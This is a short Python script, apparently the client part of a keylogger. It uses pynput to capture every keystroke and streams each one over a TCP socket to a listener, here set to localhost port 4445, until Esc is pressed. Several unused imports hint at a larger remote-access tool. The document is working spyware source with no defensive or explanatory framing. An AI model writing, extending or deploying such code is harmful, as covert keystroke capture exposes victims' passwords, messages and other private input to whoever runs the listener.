import socket, os, subprocess, pathlib, platform, logging
from threading import Thread
from pynput.keyboard import Key, Listener

def connect():
	notConnected = True
	while notConnected:
		os.system('cls')
		global host
		global port
		global s

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		port = 4445
		host = 'localhost'

		try:
			print('[!] Trying To Connect To %s:%s'%(host, port))
			s.connect((host,port))
			print('[*] Connection Established')
			notConnected = False
		except Exception as e:
			print('Could Not Connect: ', e)

def send(args):
	send = s.send(args.encode('utf8'))

def on_press(key):
	print(str(key))
	send(str(key))
	if key == Key.esc:
		return False

connect()
with Listener(on_press=on_press) as listener:
	listener.join()